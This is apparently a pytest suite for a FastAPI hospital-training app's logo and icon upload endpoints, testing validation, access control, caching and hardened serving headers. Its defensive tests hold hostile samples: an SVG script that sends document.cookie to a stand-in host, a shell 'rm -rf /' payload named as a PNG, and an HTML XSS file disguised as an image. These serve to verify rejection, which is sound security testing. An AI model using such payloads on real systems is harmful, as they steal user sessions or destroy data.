"""Institution branding upload and serving.

Upload is one of the few endpoints that accepts arbitrary bytes from a user, so
most of these tests are about what it *refuses*.
"""

from __future__ import annotations

import struct
import zlib

from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.models.branding import MAX_ASSET_BYTES, BrandingAsset

API = "/api/v1"


# --------------------------------------------------------------------------
def png_bytes(width: int = 64, height: int = 64) -> bytes:
    """A minimal, genuinely valid PNG — real magic bytes and a real IHDR."""

    def chunk(tag: bytes, payload: bytes) -> bytes:
        return (
            struct.pack(">I", len(payload))
            + tag
            + payload
            + struct.pack(">I", zlib.crc32(tag + payload) & 0xFFFFFFFF)
        )

    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    raw = b"".join(b"\x00" + b"\x16\x65\x34" * width for _ in range(height))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


CLEAN_SVG = (
    b'<?xml version="1.0"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40">'
    b'<rect width="120" height="40" fill="#166534"/></svg>'
)

SCRIPTED_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">'
    b'<script>fetch("https://evil.example/"+document.cookie)</script>'
    b'<rect width="64" height="64"/></svg>'
)


def upload(client: TestClient, headers: dict, kind: str, data: bytes,
           filename: str, content_type: str):
    return client.put(
        f"{API}/tenancy/tenants/current/branding/{kind}",
        headers=headers,
        files={"file": (filename, data, content_type)},
    )


# ==========================================================================
class TestUpload:
    def test_upload_and_serve_a_logo(self, client: TestClient, institution: dict, auth):
        headers = auth("director@tth.health")
        response = upload(client, headers, "logo", png_bytes(200, 60), "crest.png", "image/png")
        assert response.status_code == 201, response.text

        body = response.json()
        assert body["content_type"] == "image/png"
        assert (body["width"], body["height"]) == (200, 60)

        # Serving is public — the sign-in screen needs it before a session exists.
        served = client.get(body["url"])
        assert served.status_code == 200
        assert served.headers["content-type"].startswith("image/png")
        assert served.content == png_bytes(200, 60)

    def test_svg_logo_is_accepted(self, client: TestClient, institution: dict, auth):
        response = upload(client, auth("director@tth.health"), "logo",
                          CLEAN_SVG, "crest.svg", "image/svg+xml")
        assert response.status_code == 201, response.text
        assert response.json()["content_type"] == "image/svg+xml"
        # Dimensions come from the viewBox.
        assert (response.json()["width"], response.json()["height"]) == (120, 40)

    def test_reupload_replaces_rather_than_duplicates(
        self, client: TestClient, institution: dict, auth, db: Session
    ):
        headers = auth("director@tth.health")
        upload(client, headers, "logo", png_bytes(64, 64), "a.png", "image/png")
        upload(client, headers, "logo", png_bytes(128, 128), "b.png", "image/png")

        rows = db.query(BrandingAsset).filter_by(
            tenant_id=institution["tenant"].id, kind="logo"
        ).all()
        assert len(rows) == 1
        assert rows[0].width == 128

    def test_each_kind_is_stored_separately(self, client: TestClient, institution: dict, auth):
        headers = auth("director@tth.health")
        assert upload(client, headers, "logo", png_bytes(200, 60), "l.png", "image/png").status_code == 201
        assert upload(client, headers, "icon", png_bytes(512, 512), "i.png", "image/png").status_code == 201

        summary = client.get(f"{API}/tenancy/tenants/current/branding", headers=headers)
        assert summary.status_code == 200
        assert set(summary.json()["assets"]) == {"logo", "icon"}


class TestUploadIsDefensive:
    def test_a_non_image_is_rejected(self, client: TestClient, institution: dict, auth):
        response = upload(client, auth("director@tth.health"), "logo",
                          b"#!/bin/sh\nrm -rf /\n", "logo.png", "image/png")
        assert response.status_code == 422
        assert "not a recognised image" in response.json()["detail"]

    def test_html_disguised_as_png_is_rejected(self, client: TestClient, institution: dict, auth):
        """A browser sniffs content regardless of the declared type, so a stored
        HTML file served from our origin would be stored XSS."""
        response = upload(client, auth("director@tth.health"), "logo",
                          b"<html><script>alert(1)</script></html>", "x.png", "image/png")
        assert response.status_code == 422

    def test_scripted_svg_is_rejected(self, client: TestClient, institution: dict, auth):
        response = upload(client, auth("director@tth.health"), "logo",
                          SCRIPTED_SVG, "evil.svg", "image/svg+xml")
        assert response.status_code == 422
        assert "scripting" in response.json()["detail"]

    def test_content_type_mismatch_is_rejected(self, client: TestClient, institution: dict, auth):
        response = upload(client, auth("director@tth.health"), "logo",
                          png_bytes(), "crest.jpg", "image/jpeg")
        assert response.status_code == 422
        assert "contents are" in response.json()["detail"]

    def test_oversized_file_is_rejected_with_the_limit(
        self, client: TestClient, institution: dict, auth
    ):
        oversized = png_bytes(8, 8) + b"\x00" * (MAX_ASSET_BYTES + 1)
        response = upload(client, auth("director@tth.health"), "logo",
                          oversized, "huge.png", "image/png")
        assert response.status_code == 422
        assert "limit is" in response.json()["detail"]

    def test_empty_file_is_rejected(self, client: TestClient, institution: dict, auth):
        response = upload(client, auth("director@tth.health"), "logo",
                          b"", "empty.png", "image/png")
        assert response.status_code == 422

    def test_non_square_app_icon_is_rejected(self, client: TestClient, institution: dict, auth):
        """Installed apps crop the icon to a square; a wide logo loses its edges."""
        response = upload(client, auth("director@tth.health"), "icon",
                          png_bytes(512, 128), "wide.png", "image/png")
        assert response.status_code == 422
        assert "must be square" in response.json()["detail"]
        assert "512×128" in response.json()["detail"]

    def test_unknown_asset_kind_is_rejected(self, client: TestClient, institution: dict, auth):
        response = upload(client, auth("director@tth.health"), "wallpaper",
                          png_bytes(), "x.png", "image/png")
        assert response.status_code == 422
        assert "Unknown branding asset" in response.json()["detail"]


class TestAccessControl:
    def test_a_trainee_cannot_change_institution_branding(
        self, client: TestClient, institution: dict, auth
    ):
        response = upload(client, auth("registrar@tth.health"), "logo",
                          png_bytes(), "crest.png", "image/png")
        assert response.status_code == 403

    def test_a_consultant_cannot_change_institution_branding(
        self, client: TestClient, institution: dict, auth
    ):
        response = upload(client, auth("consultant@tth.health"), "logo",
                          png_bytes(), "crest.png", "image/png")
        assert response.status_code == 403

    def test_serving_needs_no_session(self, client: TestClient, institution: dict, auth):
        upload(client, auth("director@tth.health"), "logo",
               png_bytes(), "crest.png", "image/png")
        tenant_id = institution["tenant"].id
        response = client.get(f"{API}/tenancy/tenants/{tenant_id}/branding/logo")
        assert response.status_code == 200

    def test_public_branding_lookup_needs_no_session(
        self, client: TestClient, institution: dict, auth
    ):
        upload(client, auth("director@tth.health"), "logo",
               png_bytes(), "crest.png", "image/png")
        response = client.get(f"{API}/tenancy/public/branding",
                              params={"code": institution["tenant"].code})
        assert response.status_code == 200
        body = response.json()
        assert body["name"] == "Test Teaching Hospital"
        assert "logo" in body["assets"]

    def test_public_branding_falls_back_gracefully(self, client: TestClient, institution: dict):
        response = client.get(f"{API}/tenancy/public/branding", params={"code": "NOPE"})
        assert response.status_code == 200
        assert response.json()["tenant_id"] is None
        assert response.json()["name"] == "Residency Training Console"


class TestServing:
    def test_served_with_hardened_headers(self, client: TestClient, institution: dict, auth):
        """An uploaded SVG opened directly must not be able to execute."""
        upload(client, auth("director@tth.health"), "logo",
               CLEAN_SVG, "crest.svg", "image/svg+xml")
        response = client.get(
            f"{API}/tenancy/tenants/{institution['tenant'].id}/branding/logo"
        )
        assert response.headers["x-content-type-options"] == "nosniff"
        assert "sandbox" in response.headers["content-security-policy"]

    def test_etag_avoids_resending_an_unchanged_logo(
        self, client: TestClient, institution: dict, auth
    ):
        upload(client, auth("director@tth.health"), "logo",
               png_bytes(), "crest.png", "image/png")
        url = f"{API}/tenancy/tenants/{institution['tenant'].id}/branding/logo"

        first = client.get(url)
        assert first.status_code == 200
        etag = first.headers["etag"]

        second = client.get(url, headers={"If-None-Match": etag})
        assert second.status_code == 304
        assert second.content == b""

    def test_missing_asset_returns_an_explanatory_404(
        self, client: TestClient, institution: dict
    ):
        response = client.get(
            f"{API}/tenancy/tenants/{institution['tenant'].id}/branding/icon"
        )
        assert response.status_code == 404
        assert "No icon has been uploaded" in response.json()["detail"]


class TestRemoval:
    def test_remove_a_logo(self, client: TestClient, institution: dict, auth):
        headers = auth("director@tth.health")
        upload(client, headers, "logo", png_bytes(), "crest.png", "image/png")

        removed = client.delete(f"{API}/tenancy/tenants/current/branding/logo", headers=headers)
        assert removed.status_code == 200

        response = client.get(f"{API}/tenancy/tenants/{institution['tenant'].id}/branding/logo")
        assert response.status_code == 404


class TestBrandedManifest:
    def test_manifest_carries_the_institution_identity(
        self, client: TestClient, institution: dict, auth, db: Session
    ):
        institution["tenant"].branding = {"primary": "#166534", "logo_text": "TTH"}
        db.commit()
        upload(client, auth("director@tth.health"), "icon",
               png_bytes(512, 512), "icon.png", "image/png")

        response = client.get(
            f"{API}/tenancy/tenants/{institution['tenant'].id}/manifest.webmanifest"
        )
        assert response.status_code == 200
        body = response.json()
        assert body["name"].startswith("Test Teaching Hospital")
        assert body["short_name"] == "TTH"
        assert body["theme_color"] == "#166534"
        assert body["icons"][0]["src"].endswith("/branding/icon")

    def test_manifest_falls_back_to_platform_icons(
        self, client: TestClient, institution: dict
    ):
        response = client.get(
            f"{API}/tenancy/tenants/{institution['tenant'].id}/manifest.webmanifest"
        )
        assert response.status_code == 200
        assert response.json()["icons"][0]["src"] == "/icon.svg"
